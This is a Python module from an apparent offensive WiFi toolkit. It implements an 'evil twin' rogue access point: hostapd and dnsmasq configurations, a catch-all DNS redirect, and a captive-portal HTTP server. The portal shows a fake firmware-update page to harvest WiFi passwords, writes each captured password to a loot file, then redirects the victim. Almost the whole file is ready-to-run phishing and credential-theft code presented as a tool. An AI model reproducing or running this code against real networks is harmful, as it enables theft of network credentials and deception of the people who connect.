import os, sys, time, subprocess, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from core.ui import UI, C, W, R, G, B, NC, Y, D, mini_banner

class PhishingServer(BaseHTTPRequestHandler):
    def log_message(self, format, *args): return # Silence logs

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = """
        <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>body{font-family:sans-serif;text-align:center;padding:20px;background:#f2f2f2;}
        .box{background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:400px;margin:auto;}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;}
        button{width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;}
        </style></head><body><div class="box">
        <h2>Connection Interrupted</h2><p>A firmware update is required to restore internet access.</p>
        <form method="POST"><input type="password" name="pwd" placeholder="Enter WiFi Password" required>
        <button>Install Update & Reconnect</button></form></div></body></html>
        """
        self.wfile.write(html.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        password = post_data.split("=")[1]
        
        print(f"\n{G}[+] CREDENTIAL CAPTURED: {password}{NC}")
        with open("loot/credentials.txt", "a") as f:
            f.write(f"Pass: {password}\n")
            
        self.send_response(302)
        self.send_header('Location', 'http://google.com')
        self.end_headers()

class EvilTwin:
    def __init__(self, iface, proj_dir):
        self.iface = iface
        self.path = proj_dir

    def launch(self):
        UI.banner()
        UI.print_box(["ROGUE ACCESS POINT (EVIL TWIN)", "Phishing & Captive Portal"], title="SOCIAL ENGINEERING")
        
        if sys.platform != "linux":
            print(f"\n{Y}[!] This module requires Linux network drivers (hostapd/dnsmasq).{NC}")
            print(f"{D}    Feature unavailable on Windows/Mac.{NC}")
            input(f"\n{W}Press Enter to return...{NC}")
            return

        print(f"{Y}[!] Requires a second interface or stopping monitor mode.{NC}")
        ssid = input(f"\n{B}Set Rogue SSID Name > {NC}")
        
        # 1. Configure Hostapd
        conf = f"""
interface={self.iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        with open(f"{self.path}/hostapd.conf", "w") as f: f.write(conf)
        
        # 2. Configure Dnsmasq
        dns = f"""
interface={self.iface}
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""
        with open(f"{self.path}/dns.conf", "w") as f: f.write(dns)
        
        print(f"\n{C}[*] Configuring Network Routes...{NC}")
        os.system(f"ip link set {self.iface} down")
        os.system(f"ip addr flush dev {self.iface}")
        os.system(f"ip link set {self.iface} up")
        os.system(f"ip addr add 10.0.0.1/24 dev {self.iface}")
        
        print(f"{C}[*] Starting Captive Portal & AP...{NC}")
        
        # Start Threads
        threading.Thread(target=lambda: HTTPServer(('0.0.0.0', 80), PhishingServer).serve_forever(), daemon=True).start()
        subprocess.Popen(f"dnsmasq -C {self.path}/dns.conf -d", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        try:
            subprocess.run(f"hostapd {self.path}/hostapd.conf", shell=True)
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Stopping Rogue AP...{NC}")
